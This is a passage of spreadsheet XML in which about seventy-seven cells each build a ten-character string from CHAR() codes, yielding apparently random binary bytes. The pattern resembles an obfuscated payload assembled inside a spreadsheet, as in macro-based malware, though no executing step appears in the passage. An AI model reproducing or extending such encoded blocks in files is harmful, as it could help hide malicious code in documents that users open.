        <f>CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(179)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(170)</f>
        <v>!¤ûÎ&gt;³×È!ª</v>
      </c>
    </row>
    <row r="380" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C380" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(132)&amp;CHAR(214)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(251)&amp;CHAR(205)</f>
        <v>ûÏ&gt;„ÖÌ!©ûÍ</v>
      </c>
    </row>
    <row r="381" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C381" t="str">
        <f>CHAR(63)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(234)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(250)&amp;CHAR(62)&amp;CHAR(163)</f>
        <v>?±Öê!¥ûú&gt;£</v>
      </c>
    </row>
    <row r="382" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C382" t="str">
        <f>CHAR(214)&amp;CHAR(196)&amp;CHAR(33)&amp;CHAR(175)&amp;CHAR(250)&amp;CHAR(223)&amp;CHAR(62)&amp;CHAR(134)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÄ!¯úß&gt;†ÖÈ</v>
      </c>
    </row>
    <row r="383" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C383" t="str">
        <f>CHAR(33)&amp;CHAR(156)&amp;CHAR(251)&amp;CHAR(235)&amp;CHAR(62)&amp;CHAR(189)&amp;CHAR(214)&amp;CHAR(194)&amp;CHAR(32)&amp;CHAR(181)</f>
        <v>!œûë&gt;½ÖÂ µ</v>
      </c>
    </row>
    <row r="384" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C384" t="str">
        <f>CHAR(251)&amp;CHAR(132)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(241)&amp;CHAR(33)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(195)</f>
        <v>û„&gt;±Öñ!ûÃ</v>
      </c>
    </row>
    <row r="385" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C385" t="str">
        <f>CHAR(62)&amp;CHAR(179)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(242)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(132)</f>
        <v>&gt;³×È!òûÏ&gt;„</v>
      </c>
    </row>
    <row r="386" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C386" t="str">
        <f>CHAR(214)&amp;CHAR(242)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(251)&amp;CHAR(79)&amp;CHAR(63)&amp;CHAR(161)&amp;CHAR(214)&amp;CHAR(165)</f>
        <v>Öò!©ûO?¡Ö¥</v>
      </c>
    </row>
    <row r="387" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C387" t="str">
        <f>CHAR(37)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(226)&amp;CHAR(62)&amp;CHAR(245)&amp;CHAR(214)&amp;CHAR(196)&amp;CHAR(33)&amp;CHAR(174)</f>
        <v>%¥ûâ&gt;õÖÄ!®</v>
      </c>
    </row>
    <row r="388" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C388" t="str">
        <f>CHAR(250)&amp;CHAR(223)&amp;CHAR(62)&amp;CHAR(61)&amp;CHAR(210)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(156)&amp;CHAR(251)&amp;CHAR(138)</f>
        <v>úß&gt;=ÒÈ!œûŠ</v>
      </c>
    </row>
    <row r="389" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C389" t="str">
        <f>CHAR(62)&amp;CHAR(189)&amp;CHAR(214)&amp;CHAR(217)&amp;CHAR(33)&amp;CHAR(201)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(160)</f>
        <v>&gt;½ÖÙ!ÉûÎ&gt; </v>
      </c>
    </row>
    <row r="390" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C390" t="str">
        <f>CHAR(214)&amp;CHAR(191)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(222)&amp;CHAR(62)&amp;CHAR(56)&amp;CHAR(214)&amp;CHAR(201)</f>
        <v>Ö¿!¤ûÞ&gt;8ÖÉ</v>
      </c>
    </row>
    <row r="391" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C391" t="str">
        <f>CHAR(33)&amp;CHAR(163)&amp;CHAR(253)&amp;CHAR(171)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(61)</f>
        <v>!£ý«&gt;°Öž¡=</v>
      </c>
    </row>
    <row r="392" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C392" t="str">
        <f>CHAR(251)&amp;CHAR(200)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(84)&amp;CHAR(33)&amp;CHAR(162)&amp;CHAR(251)&amp;CHAR(153)</f>
        <v>ûÈ&gt;çVT!¢û™</v>
      </c>
    </row>
    <row r="393" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C393" t="str">
        <f>CHAR(190)&amp;CHAR(23)&amp;CHAR(214)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(124)&amp;CHAR(62)&amp;CHAR(182)</f>
        <v>¾_x0017_ÖÏ!ó{|&gt;¶</v>
      </c>
    </row>
    <row r="394" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C394" t="str">
        <f>CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(111)&amp;CHAR(251)&amp;CHAR(200)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(20)</f>
        <v>Öž¡oûÈ&gt;çV_x0014_</v>
      </c>
    </row>
    <row r="395" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C395" t="str">
        <f>CHAR(33)&amp;CHAR(162)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(94)&amp;CHAR(214)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(243)</f>
        <v>!¢û™¾^ÖÏ!ó</v>
      </c>
    </row>
    <row r="396" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C396" t="str">
        <f>CHAR(123)&amp;CHAR(48)&amp;CHAR(62)&amp;CHAR(182)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(168)&amp;CHAR(250)&amp;CHAR(200)</f>
        <v>{0&gt;¶Öž¡¨úÈ</v>
      </c>
    </row>
    <row r="397" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C397" t="str">
        <f>CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(222)&amp;CHAR(32)&amp;CHAR(162)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(148)</f>
        <v>&gt;çVÞ ¢û™¾”</v>
      </c>
    </row>
    <row r="398" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C398" t="str">
        <f>CHAR(215)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(249)&amp;CHAR(63)&amp;CHAR(182)&amp;CHAR(214)&amp;CHAR(158)</f>
        <v>×Ï!ó{ù?¶Öž</v>
      </c>
    </row>
    <row r="399" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C399" t="str">
        <f>CHAR(161)&amp;CHAR(235)&amp;CHAR(250)&amp;CHAR(200)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(208)&amp;CHAR(172)&amp;CHAR(33)&amp;CHAR(164)</f>
        <v>¡ëúÈ&gt;·Ð¬!¤</v>
      </c>
    </row>
    <row r="400" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C400" t="str">
        <f>CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(235)&amp;CHAR(215)&amp;CHAR(195)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(171)</f>
        <v>û™¾ë×Ã!ó{«</v>
      </c>
    </row>
    <row r="401" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C401" t="str">
        <f>CHAR(63)&amp;CHAR(186)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(219)&amp;CHAR(250)&amp;CHAR(196)&amp;CHAR(62)&amp;CHAR(231)</f>
        <v>?ºÖž¡ÛúÄ&gt;ç</v>
      </c>
    </row>
    <row r="402" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C402" t="str">
        <f>CHAR(86)&amp;CHAR(80)&amp;CHAR(32)&amp;CHAR(174)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(26)&amp;CHAR(215)&amp;CHAR(195)</f>
        <v>VP ®û™¾_x001A_×Ã</v>
      </c>
    </row>
    <row r="403" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C403" t="str">
        <f>CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(11)&amp;CHAR(63)&amp;CHAR(186)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(112)</f>
        <v>!ó{_x000B_?ºÖž¡p</v>
      </c>
    </row>
    <row r="404" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C404" t="str">
        <f>CHAR(250)&amp;CHAR(196)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(38)&amp;CHAR(32)&amp;CHAR(174)&amp;CHAR(251)&amp;CHAR(153)</f>
        <v>úÄ&gt;çV&amp; ®û™</v>
      </c>
    </row>
    <row r="405" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C405" t="str">
        <f>CHAR(190)&amp;CHAR(190)&amp;CHAR(212)&amp;CHAR(195)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(232)&amp;CHAR(60)&amp;CHAR(186)</f>
        <v>¾¾ÔÃ!ó{è&lt;º</v>
      </c>
    </row>
    <row r="406" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C406" t="str">
        <f>CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(152)&amp;CHAR(249)&amp;CHAR(196)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(134)</f>
        <v>Öž¡˜ùÄ&gt;çV†</v>
      </c>
    </row>
    <row r="407" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C407" t="str">
        <f>CHAR(35)&amp;CHAR(174)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(216)&amp;CHAR(212)&amp;CHAR(195)&amp;CHAR(33)&amp;CHAR(243)</f>
        <v>#®û™¾ØÔÃ!ó</v>
      </c>
    </row>
    <row r="408" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C408" t="str">
        <f>CHAR(123)&amp;CHAR(78)&amp;CHAR(60)&amp;CHAR(186)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(42)&amp;CHAR(249)&amp;CHAR(196)</f>
        <v>{N&lt;ºÖž¡*ùÄ</v>
      </c>
    </row>
    <row r="409" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C409" t="str">
        <f>CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(104)&amp;CHAR(35)&amp;CHAR(174)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(12)</f>
        <v>&gt;çVh#®û™¾_x000C_</v>
      </c>
    </row>
    <row r="410" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C410" t="str">
        <f>CHAR(212)&amp;CHAR(195)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(26)&amp;CHAR(60)&amp;CHAR(190)&amp;CHAR(214)&amp;CHAR(206)</f>
        <v>ÔÃ!£û_x001A_&lt;¾ÖÎ</v>
      </c>
    </row>
    <row r="411" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C411" t="str">
        <f>CHAR(33)&amp;CHAR(123)&amp;CHAR(249)&amp;CHAR(192)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(46)&amp;CHAR(35)&amp;CHAR(164)</f>
        <v>!{ùÀ&gt;·Ö.#¤</v>
      </c>
    </row>
    <row r="412" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C412" t="str">
        <f>CHAR(251)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(67)&amp;CHAR(212)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(50)</f>
        <v>ûÉ&gt;CÔÉ!£û2</v>
      </c>
    </row>
    <row r="413" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C413" t="str">
        <f>CHAR(60)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(248)&amp;CHAR(221)&amp;CHAR(62)&amp;CHAR(183)</f>
        <v>&lt;°ÖÎ!¥øÝ&gt;·</v>
      </c>
    </row>
    <row r="414" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C414" t="str">
        <f>CHAR(214)&amp;CHAR(195)&amp;CHAR(34)&amp;CHAR(183)&amp;CHAR(251)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(164)&amp;CHAR(213)&amp;CHAR(218)</f>
        <v>ÖÃ"·ûÉ&gt;¤ÕÚ</v>
      </c>
    </row>
    <row r="415" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C415" t="str">
        <f>CHAR(33)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(210)&amp;CHAR(61)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(132)</f>
        <v>!£ûÒ=°ÖÎ!„</v>
      </c>
    </row>
    <row r="416" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C416" t="str">
        <f>CHAR(248)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(237)&amp;CHAR(34)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(201)</f>
        <v>øÎ&gt;·Öí"¤ûÉ</v>
      </c>
    </row>
    <row r="417" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C417" t="str">
        <f>CHAR(62)&amp;CHAR(156)&amp;CHAR(213)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(250)&amp;CHAR(61)&amp;CHAR(176)</f>
        <v>&gt;œÕÉ!£ûú=°</v>
      </c>
    </row>
    <row r="418" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C418" t="str">
        <f>CHAR(214)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(230)&amp;CHAR(248)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(153)</f>
        <v>ÖÎ!æøÎ&gt;·Ö™</v>
      </c>
    </row>
    <row r="419" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C419" t="str">
        <f>CHAR(34)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(208)&amp;CHAR(213)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(163)</f>
        <v>"¤ûÉ&gt;ÐÕÉ!£</v>
      </c>
    </row>
    <row r="420" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C420" t="str">
        <f>CHAR(251)&amp;CHAR(166)&amp;CHAR(61)&amp;CHAR(164)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(208)&amp;CHAR(248)&amp;CHAR(218)</f>
        <v>û¦=¤ÖÎ!ÐøÚ</v>
      </c>
    </row>
    <row r="421" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C421" t="str">
        <f>CHAR(62)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(170)&amp;CHAR(251)&amp;CHAR(201)&amp;CHAR(62)&amp;CHAR(60)</f>
        <v>&gt;·ÖI"ªûÉ&gt;&lt;</v>
      </c>
    </row>
    <row r="422" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C422" t="str">
        <f>CHAR(213)&amp;CHAR(199)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(251)&amp;CHAR(88)&amp;CHAR(61)&amp;CHAR(190)&amp;CHAR(214)&amp;CHAR(206)</f>
        <v>ÕÇ!£ûX=¾ÖÎ</v>
      </c>
    </row>
    <row r="423" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C423" t="str">
        <f>CHAR(33)&amp;CHAR(7)&amp;CHAR(248)&amp;CHAR(192)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(208)&amp;CHAR(172)&amp;CHAR(33)&amp;CHAR(161)</f>
        <v>!_x0007_øÀ&gt;·Ð¬!¡</v>
      </c>
    </row>
    <row r="424" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C424" t="str">
        <f>CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(29)&amp;CHAR(213)&amp;CHAR(208)&amp;CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(121)</f>
        <v>û™¾_x001D_ÕÐ!ó{y</v>
      </c>
    </row>
    <row r="425" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C425" t="str">
        <f>CHAR(61)&amp;CHAR(169)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(96)&amp;CHAR(248)&amp;CHAR(215)&amp;CHAR(62)&amp;CHAR(231)</f>
        <v>=©Öž¡`ø×&gt;ç</v>
      </c>
    </row>
    <row r="426" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C426" t="str">
        <f>CHAR(86)&amp;CHAR(25)&amp;CHAR(34)&amp;CHAR(189)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(108)&amp;CHAR(213)&amp;CHAR(208)</f>
        <v>V_x0019_"½û™¾lÕÐ</v>
      </c>
    </row>
    <row r="427" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C427" t="str">
        <f>CHAR(33)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(34)&amp;CHAR(61)&amp;CHAR(169)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(90)</f>
        <v>!ó{"=©Öž¡Z</v>
      </c>
    </row>
    <row r="428" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C428" t="str">
        <f>CHAR(248)&amp;CHAR(215)&amp;CHAR(62)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(216)&amp;CHAR(37)&amp;CHAR(189)&amp;CHAR(251)&amp;CHAR(153)</f>
        <v>ø×&gt;çVØ%½û™</v>
      </c>
    </row>
    <row r="429" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C429" t="str">
        <f>CHAR(190)&amp;CHAR(173)&amp;CHAR(210)&amp;CHAR(208)&amp;CHAR(33)&amp;CHAR(150)&amp;CHAR(250)&amp;CHAR(84)&amp;CHAR(58)&amp;CHAR(148)</f>
        <v>¾­ÒÐ!–úT:”</v>
      </c>
    </row>
    <row r="430" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C430" t="str">
        <f>CHAR(214)&amp;CHAR(144)&amp;CHAR(1)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(55)&amp;CHAR(206)&amp;CHAR(147)</f>
        <v>Ö_x0001_¥ûÏ&gt;7Î“</v>
      </c>
    </row>
    <row r="431" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C431" t="str">
        <f>CHAR(37)&amp;CHAR(185)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(209)&amp;CHAR(246)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>%¹ûÎ&gt;ÑöÈ!¥</v>
      </c>
    </row>
    <row r="432" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C432" t="str">
        <f>CHAR(251)&amp;CHAR(89)&amp;CHAR(62)&amp;CHAR(34)&amp;CHAR(209)&amp;CHAR(103)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûY&gt;"Ñg!¤ûÏ</v>
      </c>
    </row>
    <row r="433" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C433" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(72)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(219)&amp;CHAR(101)&amp;CHAR(59)&amp;CHAR(120)</f>
        <v>&gt;±ÖH!3Ûe;x</v>
      </c>
    </row>
    <row r="434" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C434" t="str">
        <f>CHAR(214)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(49)&amp;CHAR(214)&amp;CHAR(94)</f>
        <v>ÖÉ!¥ûÏ&gt;1Ö^</v>
      </c>
    </row>
    <row r="435" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C435" t="str">
        <f>CHAR(1)&amp;CHAR(68)&amp;CHAR(254)&amp;CHAR(30)&amp;CHAR(62)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>_x0001_Dþ_x001E_&gt;µÖÈ!¥</v>
      </c>
    </row>
    <row r="436" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C436" t="str">
        <f>CHAR(251)&amp;CHAR(79)&amp;CHAR(62)&amp;CHAR(39)&amp;CHAR(246)&amp;CHAR(224)&amp;CHAR(39)&amp;CHAR(121)&amp;CHAR(251)&amp;CHAR(198)</f>
        <v>ûO&gt;'öà'yûÆ</v>
      </c>
    </row>
    <row r="437" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C437" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(89)&amp;CHAR(30)&amp;CHAR(242)</f>
        <v>&gt;±ÖÈ!%ûY_x001E_ò</v>
      </c>
    </row>
    <row r="438" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C438" t="str">
        <f>CHAR(208)&amp;CHAR(43)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(72)</f>
        <v>Ð+!©ûÏ&gt;±ÖH</v>
      </c>
    </row>
    <row r="439" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C439" t="str">
        <f>CHAR(33)&amp;CHAR(52)&amp;CHAR(219)&amp;CHAR(177)&amp;CHAR(56)&amp;CHAR(93)&amp;CHAR(214)&amp;CHAR(217)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!4Û±8]ÖÙ!¥</v>
      </c>
    </row>
    <row r="440" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C440" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(49)&amp;CHAR(214)&amp;CHAR(94)&amp;CHAR(1)&amp;CHAR(90)&amp;CHAR(251)&amp;CHAR(57)</f>
        <v>ûÏ&gt;1Ö^_x0001_Zû9</v>
      </c>
    </row>
    <row r="441" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C441" t="str">
        <f>CHAR(62)&amp;CHAR(167)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(79)&amp;CHAR(62)&amp;CHAR(39)</f>
        <v>&gt;§ÖÈ!¥ûO&gt;'</v>
      </c>
    </row>
    <row r="442" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C442" t="str">
        <f>CHAR(246)&amp;CHAR(158)&amp;CHAR(38)&amp;CHAR(172)&amp;CHAR(250)&amp;CHAR(239)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>öž&amp;¬úï&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="443" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C443" t="str">
        <f>CHAR(33)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(89)&amp;CHAR(30)&amp;CHAR(210)&amp;CHAR(209)&amp;CHAR(193)&amp;CHAR(32)&amp;CHAR(132)</f>
        <v>!%ûY_x001E_ÒÑÁ „</v>
      </c>
    </row>
    <row r="444" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C444" t="str">
        <f>CHAR(251)&amp;CHAR(164)&amp;CHAR(31)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(52)&amp;CHAR(227)&amp;CHAR(87)</f>
        <v>û¤_x001F_±ÖÈ!4ãW</v>
      </c>
    </row>
    <row r="445" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C445" t="str">
        <f>CHAR(57)&amp;CHAR(30)&amp;CHAR(214)&amp;CHAR(234)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(115)</f>
        <v>9_x001E_Öê!¥ûÎ&gt;s</v>
      </c>
    </row>
    <row r="446" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C446" t="str">
        <f>CHAR(211)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(29)&amp;CHAR(59)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(203)</f>
        <v>ÓÈ!§û_x001D_;±ÖË</v>
      </c>
    </row>
    <row r="447" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C447" t="str">
        <f>CHAR(33)&amp;CHAR(87)&amp;CHAR(249)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(29)&amp;CHAR(35)&amp;CHAR(165)</f>
        <v>!WùÏ&gt;°Ö_x001D_#¥</v>
      </c>
    </row>
    <row r="448" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C448" t="str">
        <f>CHAR(251)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(69)&amp;CHAR(211)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(166)&amp;CHAR(251)&amp;CHAR(205)</f>
        <v>ûÍ&gt;EÓÈ!¦ûÍ</v>
      </c>
    </row>
    <row r="449" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C449" t="str">
        <f>CHAR(56)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(174)&amp;CHAR(253)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(180)</f>
        <v>8±ÖÌ!®ýÍ&gt;´</v>
      </c>
    </row>
    <row r="450" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C450" t="str">
        <f>CHAR(214)&amp;CHAR(217)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(132)&amp;CHAR(208)&amp;CHAR(200)</f>
        <v>ÖÙ'¥ûÎ&gt;„ÐÈ</v>
      </c>
    </row>
    <row r="451" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C451" t="str">
        <f>CHAR(33)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(17)&amp;CHAR(60)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(203)&amp;CHAR(33)&amp;CHAR(153)</f>
        <v>!§û_x0011_&lt;±ÖË!™</v>
      </c>
    </row>
    <row r="452" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C452" t="str">
        <f>CHAR(253)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(214)&amp;CHAR(29)&amp;CHAR(35)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(205)</f>
        <v>ýÏ&gt;°Ö_x001D_#¥ûÍ</v>
      </c>
    </row>
    <row r="453" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C453" t="str">
        <f>CHAR(62)&amp;CHAR(227)&amp;CHAR(208)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(166)&amp;CHAR(251)&amp;CHAR(147)&amp;CHAR(56)&amp;CHAR(177)</f>
        <v>&gt;ãÐÈ!¦û“8±</v>
      </c>
    </row>
    <row r="454" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C454" t="str">
        <f>CHAR(214)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(198)&amp;CHAR(253)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(180)&amp;CHAR(214)&amp;CHAR(188)</f>
        <v>ÖÌ!ÆýÏ&gt;´Ö¼</v>
      </c>
    </row>
    <row r="455" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C455" t="str">
        <f>CHAR(39)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(100)&amp;CHAR(212)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(167)</f>
        <v>'¥ûÎ&gt;dÔÈ!§</v>
      </c>
    </row>
    <row r="456" spans="3:3" x14ac:dyDescent="0.25">
